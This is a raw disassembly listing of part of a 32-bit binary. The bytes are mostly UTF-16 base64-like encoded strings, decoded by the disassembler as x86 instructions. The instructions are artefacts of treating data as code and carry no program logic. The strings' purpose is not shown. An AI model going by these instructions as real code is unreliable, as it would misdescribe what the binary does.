10003c1c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003c20:	6b 00 39             	imul   $0x39,(%eax),%eax
10003c23:	00 6a 00             	add    %ch,0x0(%edx)
10003c26:	61                   	popa
10003c27:	00 7a 00             	add    %bh,0x0(%edx)
10003c2a:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003c2e:	53                   	push   %ebx
10003c2f:	00 55 00             	add    %dl,0x0(%ebp)
10003c32:	68 00 46 00 5a       	push   $0x5a004600
10003c37:	00 45 00             	add    %al,0x0(%ebp)
10003c3a:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003c3f:	00 6a 00             	add    %ch,0x0(%edx)
10003c42:	5a                   	pop    %edx
10003c43:	00 50 00             	add    %dl,0x0(%eax)
10003c46:	59                   	pop    %ecx
10003c47:	00 32                	add    %dh,(%edx)
10003c49:	00 73 00             	add    %dh,0x0(%ebx)
10003c4c:	33 00                	xor    (%eax),%eax
10003c4e:	52                   	push   %edx
10003c4f:	00 57 00             	add    %dl,0x0(%edi)
10003c52:	52                   	push   %edx
10003c53:	00 4f 00             	add    %cl,0x0(%edi)
10003c56:	53                   	push   %ebx
10003c57:	00 33                	add    %dh,(%ebx)
10003c59:	00 6f 00             	add    %ch,0x0(%edi)
10003c5c:	32 00                	xor    (%eax),%al
10003c5e:	54                   	push   %esp
10003c5f:	00 32                	add    %dh,(%edx)
10003c61:	00 4e 00             	add    %cl,0x0(%esi)
10003c64:	72 00                	jb     0x10003c66
10003c66:	4e                   	dec    %esi
10003c67:	00 31                	add    %dh,(%ecx)
10003c69:	00 4a 00             	add    %cl,0x0(%edx)
10003c6c:	32 00                	xor    (%eax),%al
10003c6e:	53                   	push   %ebx
10003c6f:	00 55 00             	add    %dl,0x0(%ebp)
10003c72:	56                   	push   %esi
10003c73:	00 6b 00             	add    %ch,0x0(%ebx)
10003c76:	54                   	push   %esp
10003c77:	00 6b 00             	add    %ch,0x0(%ebx)
10003c7a:	74 00                	je     0x10003c7c
10003c7c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003c80:	6b 00 39             	imul   $0x39,(%eax),%eax
10003c83:	00 6a 00             	add    %ch,0x0(%edx)
10003c86:	61                   	popa
10003c87:	00 7a 00             	add    %bh,0x0(%edx)
10003c8a:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003c8e:	5a                   	pop    %edx
10003c8f:	00 45 00             	add    %al,0x0(%ebp)
10003c92:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003c97:	00 6a 00             	add    %ch,0x0(%edx)
10003c9a:	5a                   	pop    %edx
10003c9b:	00 50 00             	add    %dl,0x0(%eax)
10003c9e:	59                   	pop    %ecx
10003c9f:	00 32                	add    %dh,(%edx)
10003ca1:	00 73 00             	add    %dh,0x0(%ebx)
10003ca4:	33 00                	xor    (%eax),%eax
10003ca6:	53                   	push   %ebx
10003ca7:	00 45 00             	add    %al,0x0(%ebp)
10003caa:	4a                   	dec    %edx
10003cab:	00 35 00 52 00 57    	add    %dh,0x57005200
10003cb1:	00 52 00             	add    %dl,0x0(%edx)
10003cb4:	4f                   	dec    %edi
10003cb5:	00 53 00             	add    %dl,0x0(%ebx)
10003cb8:	33 00                	xor    (%eax),%eax
10003cba:	6f                   	outsl  %ds:(%esi),(%dx)
10003cbb:	00 32                	add    %dh,(%edx)
10003cbd:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003cc1:	00 4e 00             	add    %cl,0x0(%esi)
10003cc4:	72 00                	jb     0x10003cc6
10003cc6:	4e                   	dec    %esi
10003cc7:	00 30                	add    %dh,(%eax)
10003cc9:	00 56 00             	add    %dl,0x0(%esi)
10003ccc:	6b 00 54             	imul   $0x54,(%eax),%eax
10003ccf:	00 6b 00             	add    %ch,0x0(%ebx)
10003cd2:	74 00                	je     0x10003cd4
10003cd4:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003cd8:	6b 00 39             	imul   $0x39,(%eax),%eax
10003cdb:	00 6a 00             	add    %ch,0x0(%edx)
10003cde:	61                   	popa
10003cdf:	00 7a 00             	add    %bh,0x0(%edx)
10003ce2:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10003ce6:	4d                   	dec    %ebp
10003ce7:	00 6b 00             	add    %ch,0x0(%ebx)
10003cea:	35 00 46 00 5a       	xor    $0x5a004600,%eax
10003cef:	00 45 00             	add    %al,0x0(%ebp)
10003cf2:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003cf7:	00 6a 00             	add    %ch,0x0(%edx)
10003cfa:	5a                   	pop    %edx
10003cfb:	00 50 00             	add    %dl,0x0(%eax)
10003cfe:	59                   	pop    %ecx
10003cff:	00 32                	add    %dh,(%edx)
10003d01:	00 73 00             	add    %dh,0x0(%ebx)
10003d04:	33 00                	xor    (%eax),%eax
10003d06:	52                   	push   %edx
10003d07:	00 57 00             	add    %dl,0x0(%edi)
10003d0a:	52                   	push   %edx
10003d0b:	00 4f 00             	add    %cl,0x0(%edi)
10003d0e:	53                   	push   %ebx
10003d0f:	00 33                	add    %dh,(%ebx)
10003d11:	00 6f 00             	add    %ch,0x0(%edi)
10003d14:	32 00                	xor    (%eax),%al
10003d16:	54                   	push   %esp
10003d17:	00 32                	add    %dh,(%edx)
10003d19:	00 4e 00             	add    %cl,0x0(%esi)
10003d1c:	72 00                	jb     0x10003d1e
10003d1e:	4e                   	dec    %esi
10003d1f:	00 32                	add    %dh,(%edx)
10003d21:	00 78 00             	add    %bh,0x0(%eax)
10003d24:	6a 00                	push   $0x0
10003d26:	4d                   	dec    %ebp
10003d27:	00 30                	add    %dh,(%eax)
10003d29:	00 56 00             	add    %dl,0x0(%esi)
10003d2c:	6b 00 54             	imul   $0x54,(%eax),%eax
10003d2f:	00 6b 00             	add    %ch,0x0(%ebx)
10003d32:	74 00                	je     0x10003d34
10003d34:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003d38:	6b 00 39             	imul   $0x39,(%eax),%eax
10003d3b:	00 6a 00             	add    %ch,0x0(%edx)
10003d3e:	61                   	popa
10003d3f:	00 7a 00             	add    %bh,0x0(%edx)
10003d42:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003d46:	5a                   	pop    %edx
10003d47:	00 45 00             	add    %al,0x0(%ebp)
10003d4a:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003d4f:	00 6a 00             	add    %ch,0x0(%edx)
10003d52:	5a                   	pop    %edx
10003d53:	00 50 00             	add    %dl,0x0(%eax)
10003d56:	59                   	pop    %ecx
10003d57:	00 32                	add    %dh,(%edx)
10003d59:	00 73 00             	add    %dh,0x0(%ebx)
10003d5c:	33 00                	xor    (%eax),%eax
10003d5e:	54                   	push   %esp
10003d5f:	00 57 00             	add    %dl,0x0(%edi)
10003d62:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10003d66:	52                   	push   %edx
10003d67:	00 57 00             	add    %dl,0x0(%edi)
10003d6a:	52                   	push   %edx
10003d6b:	00 4f 00             	add    %cl,0x0(%edi)
10003d6e:	53                   	push   %ebx
10003d6f:	00 33                	add    %dh,(%ebx)
10003d71:	00 6f 00             	add    %ch,0x0(%edi)
10003d74:	32 00                	xor    (%eax),%al
10003d76:	54                   	push   %esp
10003d77:	00 32                	add    %dh,(%edx)
10003d79:	00 4e 00             	add    %cl,0x0(%esi)
10003d7c:	72 00                	jb     0x10003d7e
10003d7e:	4e                   	dec    %esi
10003d7f:	00 30                	add    %dh,(%eax)
10003d81:	00 56 00             	add    %dl,0x0(%esi)
10003d84:	6b 00 54             	imul   $0x54,(%eax),%eax
10003d87:	00 6b 00             	add    %ch,0x0(%ebx)
10003d8a:	74 00                	je     0x10003d8c
10003d8c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003d90:	6b 00 39             	imul   $0x39,(%eax),%eax
10003d93:	00 6a 00             	add    %ch,0x0(%edx)
10003d96:	61                   	popa
10003d97:	00 7a 00             	add    %bh,0x0(%edx)
10003d9a:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10003d9e:	56                   	push   %esi
10003d9f:	00 6e 00             	add    %ch,0x0(%esi)
10003da2:	52                   	push   %edx
10003da3:	00 46 00             	add    %al,0x0(%esi)
10003da6:	5a                   	pop    %edx
10003da7:	00 45 00             	add    %al,0x0(%ebp)
10003daa:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003daf:	00 6a 00             	add    %ch,0x0(%edx)
10003db2:	5a                   	pop    %edx
10003db3:	00 50 00             	add    %dl,0x0(%eax)
10003db6:	59                   	pop    %ecx
10003db7:	00 32                	add    %dh,(%edx)
10003db9:	00 73 00             	add    %dh,0x0(%ebx)
10003dbc:	33 00                	xor    (%eax),%eax
10003dbe:	52                   	push   %edx
10003dbf:	00 57 00             	add    %dl,0x0(%edi)
10003dc2:	52                   	push   %edx
10003dc3:	00 4f 00             	add    %cl,0x0(%edi)
10003dc6:	53                   	push   %ebx
10003dc7:	00 33                	add    %dh,(%ebx)
10003dc9:	00 6f 00             	add    %ch,0x0(%edi)
10003dcc:	32 00                	xor    (%eax),%al
10003dce:	54                   	push   %esp
10003dcf:	00 32                	add    %dh,(%edx)
10003dd1:	00 4e 00             	add    %cl,0x0(%esi)
10003dd4:	72 00                	jb     0x10003dd6
10003dd6:	4e                   	dec    %esi
10003dd7:	00 32                	add    %dh,(%edx)
10003dd9:	00 49 00             	add    %cl,0x0(%ecx)
10003ddc:	7a 00                	jp     0x10003dde
10003dde:	53                   	push   %ebx
10003ddf:	00 6b 00             	add    %ch,0x0(%ebx)
10003de2:	56                   	push   %esi
10003de3:	00 6b 00             	add    %ch,0x0(%ebx)
10003de6:	54                   	push   %esp
10003de7:	00 6b 00             	add    %ch,0x0(%ebx)
10003dea:	74 00                	je     0x10003dec
10003dec:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003df0:	6b 00 39             	imul   $0x39,(%eax),%eax
10003df3:	00 6a 00             	add    %ch,0x0(%edx)
10003df6:	61                   	popa
10003df7:	00 7a 00             	add    %bh,0x0(%edx)
10003dfa:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003dfe:	5a                   	pop    %edx
10003dff:	00 45 00             	add    %al,0x0(%ebp)
10003e02:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003e07:	00 6a 00             	add    %ch,0x0(%edx)
10003e0a:	5a                   	pop    %edx
10003e0b:	00 50 00             	add    %dl,0x0(%eax)
10003e0e:	59                   	pop    %ecx
10003e0f:	00 32                	add    %dh,(%edx)
10003e11:	00 73 00             	add    %dh,0x0(%ebx)
10003e14:	33 00                	xor    (%eax),%eax
10003e16:	4e                   	dec    %esi
10003e17:	00 55 00             	add    %dl,0x0(%ebp)
10003e1a:	56                   	push   %esi
10003e1b:	00 6b 00             	add    %ch,0x0(%ebx)
10003e1e:	54                   	push   %esp
10003e1f:	00 6b 00             	add    %ch,0x0(%ebx)
10003e22:	74 00                	je     0x10003e24
10003e24:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003e28:	6b 00 39             	imul   $0x39,(%eax),%eax
10003e2b:	00 6a 00             	add    %ch,0x0(%edx)
10003e2e:	61                   	popa
10003e2f:	00 7a 00             	add    %bh,0x0(%edx)
10003e32:	63 00                	arpl   %eax,(%eax)
10003e34:	3d 00 00 15 45       	cmp    $0x45150000,%eax
10003e39:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
10003e3d:	00 4b 00             	add    %cl,0x0(%ebx)
10003e40:	7a 00                	jp     0x10003e42
10003e42:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
10003e46:	63 00                	arpl   %eax,(%eax)
10003e48:	6b 00 37             	imul   $0x37,(%eax),%eax
10003e4b:	00 00                	add    %al,(%eax)
10003e4d:	81 b1 63 00 6c 00 56 	xorl   $0x590056,0x6c0063(%ecx)
10003e54:	00 59 00 
10003e57:	55                   	push   %ebp
10003e58:	00 33                	add    %dh,(%ebx)
10003e5a:	00 6b 00             	add    %ch,0x0(%ebx)
10003e5d:	79 00                	jns    0x10003e5f
10003e5f:	5a                   	pop    %edx
10003e60:	00 45 00             	add    %al,0x0(%ebp)
10003e63:	5a                   	pop    %edx
10003e64:	00 32                	add    %dh,(%edx)
10003e66:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10003e6a:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003e6e:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003e72:	00 4a 00             	add    %cl,0x0(%edx)
10003e75:	56                   	push   %esi
10003e76:	00 57 00             	add    %dl,0x0(%edi)
10003e79:	46                   	inc    %esi
10003e7a:	00 4e 00             	add    %cl,0x0(%esi)
10003e7d:	35 00 4d 00 6d       	xor    $0x6d004d00,%eax
10003e82:	00 52 00             	add    %dl,0x0(%edx)
10003e85:	47                   	inc    %edi
10003e86:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10003e8a:	00 39                	add    %bh,(%ecx)
10003e8c:	00 79 00             	add    %bh,0x0(%ecx)
10003e8f:	56                   	push   %esi
10003e90:	00 56 00             	add    %dl,0x0(%esi)
10003e93:	68 00 54 00 65       	push   $0x65005400
10003e98:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003e9c:	00 6b 00             	add    %ch,0x0(%ebx)
10003e9f:	52                   	push   %edx
10003ea0:	00 6e 00             	add    %ch,0x0(%esi)
10003ea3:	5a                   	pop    %edx
10003ea4:	00 50 00             	add    %dl,0x0(%eax)
10003ea7:	64 00 32             	add    %dh,%fs:(%edx)
10003eaa:	00 4a 00             	add    %cl,0x0(%edx)
10003ead:	74 00                	je     0x10003eaf
10003eaf:	63 00                	arpl   %eax,(%eax)
10003eb1:	6c                   	insb   (%dx),%es:(%edi)
10003eb2:	00 56 00             	add    %dl,0x0(%esi)
10003eb5:	59                   	pop    %ecx
10003eb6:	00 55 00             	add    %dl,0x0(%ebp)
10003eb9:	33 00                	xor    (%eax),%eax
10003ebb:	6b 00 79             	imul   $0x79,(%eax),%eax
10003ebe:	00 5a 00             	add    %bl,0x0(%edx)
10003ec1:	45                   	inc    %ebp
10003ec2:	00 5a 00             	add    %bl,0x0(%edx)
10003ec5:	32 00                	xor    (%eax),%al
10003ec7:	54                   	push   %esp
10003ec8:	00 33                	add    %dh,(%ebx)
10003eca:	00 4a 00             	add    %cl,0x0(%edx)
10003ecd:	56                   	push   %esi
10003ece:	00 57 00             	add    %dl,0x0(%edi)
10003ed1:	46                   	inc    %esi
10003ed2:	00 4e 00             	add    %cl,0x0(%esi)
10003ed5:	35 00 4d 00 6d       	xor    $0x6d004d00,%eax
10003eda:	00 52 00             	add    %dl,0x0(%edx)
10003edd:	47                   	inc    %edi
10003ede:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10003ee2:	00 39                	add    %bh,(%ecx)
10003ee4:	00 57 00             	add    %dl,0x0(%edi)
10003ee7:	4d                   	dec    %ebp
10003ee8:	00 46 00             	add    %al,0x0(%esi)
10003eeb:	68 00 79 00 56       	push   $0x56007900
10003ef0:	00 56 00             	add    %dl,0x0(%esi)
10003ef3:	68 00 54 00 65       	push   $0x65005400
10003ef8:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003efc:	00 6b 00             	add    %ch,0x0(%ebx)
10003eff:	52                   	push   %edx
10003f00:	00 6e 00             	add    %ch,0x0(%esi)
10003f03:	5a                   	pop    %edx
10003f04:	00 50 00             	add    %dl,0x0(%eax)
10003f07:	63 00                	arpl   %eax,(%eax)
10003f09:	6c                   	insb   (%dx),%es:(%edi)
10003f0a:	00 56 00             	add    %dl,0x0(%esi)
10003f0d:	59                   	pop    %ecx
10003f0e:	00 55 00             	add    %dl,0x0(%ebp)
10003f11:	33 00                	xor    (%eax),%eax
10003f13:	6b 00 79             	imul   $0x79,(%eax),%eax
10003f16:	00 5a 00             	add    %bl,0x0(%edx)
10003f19:	45                   	inc    %ebp
10003f1a:	00 5a 00             	add    %bl,0x0(%edx)
10003f1d:	32 00                	xor    (%eax),%al
10003f1f:	54                   	push   %esp
10003f20:	00 7a 00             	add    %bh,0x0(%edx)
10003f23:	4e                   	dec    %esi
10003f24:	00 4b 00             	add    %cl,0x0(%ebx)
10003f27:	62 00                	bound  %eax,(%eax)
10003f29:	48                   	dec    %eax
10003f2a:	00 4a 00             	add    %cl,0x0(%edx)
10003f2d:	56                   	push   %esi
10003f2e:	00 57 00             	add    %dl,0x0(%edi)
10003f31:	46                   	inc    %esi
10003f32:	00 4e 00             	add    %cl,0x0(%esi)
10003f35:	35 00 4d 00 6d       	xor    $0x6d004d00,%eax
10003f3a:	00 52 00             	add    %dl,0x0(%edx)
10003f3d:	47                   	inc    %edi
10003f3e:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10003f42:	00 39                	add    %bh,(%ecx)
10003f44:	00 79 00             	add    %bh,0x0(%ecx)
10003f47:	56                   	push   %esi
10003f48:	00 56 00             	add    %dl,0x0(%esi)
10003f4b:	68 00 54 00 65       	push   $0x65005400
10003f50:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003f54:	00 6b 00             	add    %ch,0x0(%ebx)
10003f57:	52                   	push   %edx
10003f58:	00 6e 00             	add    %ch,0x0(%esi)
10003f5b:	5a                   	pop    %edx
10003f5c:	00 50 00             	add    %dl,0x0(%eax)
10003f5f:	57                   	push   %edi
10003f60:	00 6a 00             	add    %ch,0x0(%edx)
10003f63:	4e                   	dec    %esi
10003f64:	00 4f 00             	add    %cl,0x0(%edi)
10003f67:	63 00                	arpl   %eax,(%eax)
10003f69:	6c                   	insb   (%dx),%es:(%edi)
10003f6a:	00 56 00             	add    %dl,0x0(%esi)
10003f6d:	59                   	pop    %ecx
10003f6e:	00 55 00             	add    %dl,0x0(%ebp)
10003f71:	33 00                	xor    (%eax),%eax
10003f73:	6b 00 79             	imul   $0x79,(%eax),%eax
10003f76:	00 5a 00             	add    %bl,0x0(%edx)
10003f79:	45                   	inc    %ebp
10003f7a:	00 5a 00             	add    %bl,0x0(%edx)
10003f7d:	32 00                	xor    (%eax),%al
10003f7f:	54                   	push   %esp
10003f80:	00 33                	add    %dh,(%ebx)
10003f82:	00 4a 00             	add    %cl,0x0(%edx)
10003f85:	56                   	push   %esi
10003f86:	00 57 00             	add    %dl,0x0(%edi)
10003f89:	46                   	inc    %esi
10003f8a:	00 4e 00             	add    %cl,0x0(%esi)
10003f8d:	35 00 4d 00 6d       	xor    $0x6d004d00,%eax
10003f92:	00 52 00             	add    %dl,0x0(%edx)
10003f95:	47                   	inc    %edi
10003f96:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10003f9a:	00 39                	add    %bh,(%ecx)
10003f9c:	00 34 00             	add    %dh,(%eax,%eax,1)
10003f9f:	59                   	pop    %ecx
10003fa0:	00 6b 00             	add    %ch,0x0(%ebx)
10003fa3:	46                   	inc    %esi
10003fa4:	00 79 00             	add    %bh,0x0(%ecx)
10003fa7:	56                   	push   %esi
10003fa8:	00 56 00             	add    %dl,0x0(%esi)
10003fab:	68 00 54 00 65       	push   $0x65005400
10003fb0:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003fb4:	00 6b 00             	add    %ch,0x0(%ebx)
10003fb7:	52                   	push   %edx
10003fb8:	00 6e 00             	add    %ch,0x0(%esi)
10003fbb:	5a                   	pop    %edx
10003fbc:	00 50 00             	add    %dl,0x0(%eax)
10003fbf:	63 00                	arpl   %eax,(%eax)
10003fc1:	6c                   	insb   (%dx),%es:(%edi)
10003fc2:	00 56 00             	add    %dl,0x0(%esi)
10003fc5:	59                   	pop    %ecx
10003fc6:	00 55 00             	add    %dl,0x0(%ebp)
10003fc9:	33 00                	xor    (%eax),%eax
10003fcb:	6b 00 79             	imul   $0x79,(%eax),%eax
10003fce:	00 5a 00             	add    %bl,0x0(%edx)
10003fd1:	45                   	inc    %ebp
10003fd2:	00 5a 00             	add    %bl,0x0(%edx)
10003fd5:	32 00                	xor    (%eax),%al
10003fd7:	54                   	push   %esp
10003fd8:	00 7a 00             	add    %bh,0x0(%edx)
10003fdb:	30 00                	xor    %al,(%eax)
10003fdd:	39 00                	cmp    %eax,(%eax)
10003fdf:	63 00                	arpl   %eax,(%eax)
10003fe1:	6c                   	insb   (%dx),%es:(%edi)
10003fe2:	00 56 00             	add    %dl,0x0(%esi)
10003fe5:	59                   	pop    %ecx
10003fe6:	00 55 00             	add    %dl,0x0(%ebp)
10003fe9:	33 00                	xor    (%eax),%eax
10003feb:	6b 00 79             	imul   $0x79,(%eax),%eax
10003fee:	00 5a 00             	add    %bl,0x0(%edx)
10003ff1:	45                   	inc    %ebp
10003ff2:	00 5a 00             	add    %bl,0x0(%edx)
10003ff5:	32 00                	xor    (%eax),%al
10003ff7:	54                   	push   %esp
10003ff8:	00 77 00             	add    %dh,0x0(%edi)
10003ffb:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004000:	15 72 00 55 00       	adc    $0x550072,%eax
10004005:	58                   	pop    %eax
10004006:	00 53 00             	add    %dl,0x0(%ebx)
10004009:	79 00                	jns    0x1000400b
1000400b:	32 00                	xor    (%eax),%al
1000400d:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004011:	76 00                	jbe    0x10004013
10004013:	4f                   	dec    %edi
10004014:	00 00                	add    %al,(%eax)
10004016:	81 b1 62 00 56 00 56 	xorl   $0x530056,0x560062(%ecx)
1000401d:	00 53 00 
10004020:	53                   	push   %ebx
10004021:	00 6a 00             	add    %ch,0x0(%edx)
10004024:	68 00 6d 00 55       	push   $0x55006d00
10004029:	00 47 00             	add    %al,0x0(%edi)
1000402c:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10004030:	4f                   	dec    %edi
10004031:	00 56 00             	add    %dl,0x0(%esi)
10004034:	6c                   	insb   (%dx),%es:(%edi)
10004035:	00 59 00             	add    %bl,0x0(%ecx)
10004038:	54                   	push   %esp
10004039:	00 6d 00             	add    %ch,0x0(%ebp)
1000403c:	31 00                	xor    %eax,(%eax)
1000403e:	56                   	push   %esi
1000403f:	00 55 00             	add    %dl,0x0(%ebp)
10004042:	6b 00 6f             	imul   $0x6f,(%eax),%eax
10004045:	00 34 00             	add    %dh,(%eax,%eax,1)
10004048:	5a                   	pop    %edx
10004049:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
1000404d:	00 6e 00             	add    %ch,0x0(%esi)
10004050:	59                   	pop    %ecx
10004051:	00 6a 00             	add    %ch,0x0(%edx)
10004054:	6c                   	insb   (%dx),%es:(%edi)
10004055:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
10004059:	00 56 00             	add    %dl,0x0(%esi)
1000405c:	4a                   	dec    %edx
1000405d:	00 4b 00             	add    %cl,0x0(%ebx)
10004060:	4f                   	dec    %edi
10004061:	00 47 00             	add    %al,0x0(%edi)
10004064:	5a                   	pop    %edx
10004065:	00 51 00             	add    %dl,0x0(%ecx)
10004068:	5a                   	pop    %edx
10004069:	00 32                	add    %dh,(%edx)
1000406b:	00 49 00             	add    %cl,0x0(%ecx)
1000406e:	35 00 64 00 32       	xor    $0x32006400,%eax
10004073:	00 4a 00             	add    %cl,0x0(%edx)
10004076:	74 00                	je     0x10004078
10004078:	62 00                	bound  %eax,(%eax)
1000407a:	56                   	push   %esi
1000407b:	00 56 00             	add    %dl,0x0(%esi)
1000407e:	53                   	push   %ebx
1000407f:	00 53 00             	add    %dl,0x0(%ebx)
10004082:	6a 00                	push   $0x0
10004084:	68 00 6d 00 55       	push   $0x55006d00
10004089:	00 47 00             	add    %al,0x0(%edi)
1000408c:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10004090:	4f                   	dec    %edi
10004091:	00 57 00             	add    %dl,0x0(%edi)
10004094:	31 00                	xor    %eax,(%eax)
10004096:	56                   	push   %esi
10004097:	00 55 00             	add    %dl,0x0(%ebp)
1000409a:	6b 00 6f             	imul   $0x6f,(%eax),%eax
1000409d:	00 34 00             	add    %dh,(%eax,%eax,1)
100040a0:	5a                   	pop    %edx
100040a1:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
100040a5:	00 6e 00             	add    %ch,0x0(%esi)
100040a8:	59                   	pop    %ecx
100040a9:	00 6a 00             	add    %ch,0x0(%edx)
100040ac:	6c                   	insb   (%dx),%es:(%edi)
100040ad:	00 57 00             	add    %dl,0x0(%edi)
100040b0:	4d                   	dec    %ebp
100040b1:	00 46 00             	add    %al,0x0(%esi)
100040b4:	68 00 74 00 56       	push   $0x56007400
100040b9:	00 56 00             	add    %dl,0x0(%esi)
100040bc:	4a                   	dec    %edx
100040bd:	00 4b 00             	add    %cl,0x0(%ebx)
100040c0:	4f                   	dec    %edi
100040c1:	00 47 00             	add    %al,0x0(%edi)
100040c4:	5a                   	pop    %edx
100040c5:	00 51 00             	add    %dl,0x0(%ecx)
100040c8:	5a                   	pop    %edx
100040c9:	00 32                	add    %dh,(%edx)
100040cb:	00 49 00             	add    %cl,0x0(%ecx)
100040ce:	35 00 62 00 56       	xor    $0x56006200,%eax
100040d3:	00 56 00             	add    %dl,0x0(%esi)
100040d6:	53                   	push   %ebx
100040d7:	00 53 00             	add    %dl,0x0(%ebx)
100040da:	6a 00                	push   $0x0
100040dc:	68 00 6d 00 55       	push   $0x55006d00
100040e1:	00 47 00             	add    %al,0x0(%edi)
100040e4:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
100040e8:	4f                   	dec    %edi
100040e9:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100040ed:	00 4f 00             	add    %cl,0x0(%edi)
100040f0:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100040f4:	31 00                	xor    %eax,(%eax)
100040f6:	56                   	push   %esi
100040f7:	00 55 00             	add    %dl,0x0(%ebp)
100040fa:	6b 00 6f             	imul   $0x6f,(%eax),%eax
100040fd:	00 34 00             	add    %dh,(%eax,%eax,1)
10004100:	5a                   	pop    %edx
10004101:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
10004105:	00 6e 00             	add    %ch,0x0(%esi)
10004108:	59                   	pop    %ecx
10004109:	00 6a 00             	add    %ch,0x0(%edx)
1000410c:	6c                   	insb   (%dx),%es:(%edi)
1000410d:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
10004111:	00 56 00             	add    %dl,0x0(%esi)
10004114:	4a                   	dec    %edx
10004115:	00 4b 00             	add    %cl,0x0(%ebx)
10004118:	4f                   	dec    %edi
10004119:	00 47 00             	add    %al,0x0(%edi)
1000411c:	5a                   	pop    %edx
1000411d:	00 51 00             	add    %dl,0x0(%ecx)
10004120:	5a                   	pop    %edx
10004121:	00 32                	add    %dh,(%edx)
10004123:	00 49 00             	add    %cl,0x0(%ecx)
10004126:	35 00 59 00 6c       	xor    $0x6c005900,%eax
1000412b:	00 68 00             	add    %ch,0x0(%eax)
1000412e:	43                   	inc    %ebx
1000412f:	00 62 00             	add    %ah,0x0(%edx)
10004132:	56                   	push   %esi
10004133:	00 56 00             	add    %dl,0x0(%esi)
10004136:	53                   	push   %ebx
10004137:	00 53 00             	add    %dl,0x0(%ebx)
1000413a:	6a 00                	push   $0x0
1000413c:	68 00 6d 00 55       	push   $0x55006d00
10004141:	00 47 00             	add    %al,0x0(%edi)
10004144:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10004148:	4f                   	dec    %edi
10004149:	00 57 00             	add    %dl,0x0(%edi)
1000414c:	31 00                	xor    %eax,(%eax)
1000414e:	56                   	push   %esi
1000414f:	00 55 00             	add    %dl,0x0(%ebp)
10004152:	6b 00 6f             	imul   $0x6f,(%eax),%eax
10004155:	00 34 00             	add    %dh,(%eax,%eax,1)
10004158:	5a                   	pop    %edx
10004159:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
1000415d:	00 6e 00             	add    %ch,0x0(%esi)
10004160:	59                   	pop    %ecx
10004161:	00 6a 00             	add    %ch,0x0(%edx)
10004164:	6c                   	insb   (%dx),%es:(%edi)
10004165:	00 77 00             	add    %dh,0x0(%edi)
10004168:	59                   	pop    %ecx
10004169:	00 6b 00             	add    %ch,0x0(%ebx)
1000416c:	64 00 74 00 56       	add    %dh,%fs:0x56(%eax,%eax,1)
10004171:	00 56 00             	add    %dl,0x0(%esi)
10004174:	4a                   	dec    %edx
10004175:	00 4b 00             	add    %cl,0x0(%ebx)
10004178:	4f                   	dec    %edi
10004179:	00 47 00             	add    %al,0x0(%edi)
1000417c:	5a                   	pop    %edx
1000417d:	00 51 00             	add    %dl,0x0(%ecx)
10004180:	5a                   	pop    %edx
10004181:	00 32                	add    %dh,(%edx)
10004183:	00 49 00             	add    %cl,0x0(%ecx)
10004186:	35 00 62 00 56       	xor    $0x56006200,%eax
1000418b:	00 56 00             	add    %dl,0x0(%esi)
1000418e:	53                   	push   %ebx
1000418f:	00 53 00             	add    %dl,0x0(%ebx)
10004192:	6a 00                	push   $0x0
10004194:	68 00 6d 00 55       	push   $0x55006d00
10004199:	00 47 00             	add    %al,0x0(%edi)
1000419c:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
100041a0:	4f                   	dec    %edi
100041a1:	00 56 00             	add    %dl,0x0(%esi)
100041a4:	5a                   	pop    %edx
100041a5:	00 35 00 62 00 56    	add    %dh,0x56006200
100041ab:	00 56 00             	add    %dl,0x0(%esi)
100041ae:	53                   	push   %ebx
100041af:	00 53 00             	add    %dl,0x0(%ebx)
100041b2:	6a 00                	push   $0x0
100041b4:	68 00 6d 00 55       	push   $0x55006d00
100041b9:	00 47 00             	add    %al,0x0(%edi)
100041bc:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
100041c0:	4f                   	dec    %edi
